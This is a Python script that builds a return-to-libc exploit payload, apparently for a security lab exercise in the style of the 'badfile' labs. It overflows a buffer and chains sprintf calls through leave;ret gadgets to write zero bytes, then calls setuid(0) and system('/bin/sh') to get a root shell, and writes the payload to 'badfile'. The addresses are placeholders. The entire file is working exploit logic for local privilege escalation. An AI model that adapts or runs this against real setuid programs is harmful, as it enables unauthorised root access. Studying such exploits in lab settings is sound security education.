#!/usr/bin/python3
import sys

def tobytes (value):
	return (value).to_bytes(4,byteorder='little')

content = bytearray(0xaa for i in range(112))

sh_addr = 0x1 # address of "/bin/sh"
leaveret = 0x2 #address of leaveret
sprintf_addr = 0x3 #address of sprintf()
setuid_addr = 0x4 #address of setuid()
system_addr = 0x5 #address of system()
exit_addr = 0x6
ebp_foo = 0x7 # foo()'s frame pointer

#calculate the address of setuid()'s 1st argument 
sprintf_arg1 = ebp_foo + 12 + 5*0x20
# the address of a byte that contains 0x00
sprintf_arg2 = sh_addr + len("/bin/sh")

content = bytearray(0xaa for i in range(112))

#use leaveret to return to the first sprintf()
ebp_next = ebp_foo + 0x20
content += tobytes(ebp_next)
content += tobytes(leaveret)
content += b'A' * (0x20 - 2*4)

#sprintf(sprintf_arg1, sprintf_arg2)
for i in range(4):
	ebp_next += 0x20
	content += tobytes(ebp_next)
	content += tobytes(sprintf_addr)
	content += tobytes(leaveret)
	content += tobytes(sprintf_arg1)
	content += tobytes(sprintf_arg2)
	content += b'A' * (0x20 -5*4)
	sprintf_arg1 +=1 #set the address for the next byte

#setuid(0)
ebp_next += 0x20 
content += tobytes(ebp_next)
content += tobytes(setuid_addr)
content += tobytes(leaveret)
content += tobytes(0xFFFFFFFF) # value will be overwritten
content += b'A' * (0x20 - 4*4)

#system("/bin/sh")
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(system_addr)
content += tobytes(leaveret)
content += tobytes(sh_addr)
content += b'A' * (0x20 -4*4)

#exit()
content += tobytes(0xFFFFFFFF) #not important
content += tobytes(exit_addr)

#write the content to badfile
with open("badfile", "wb") as f:
	f.write(content)
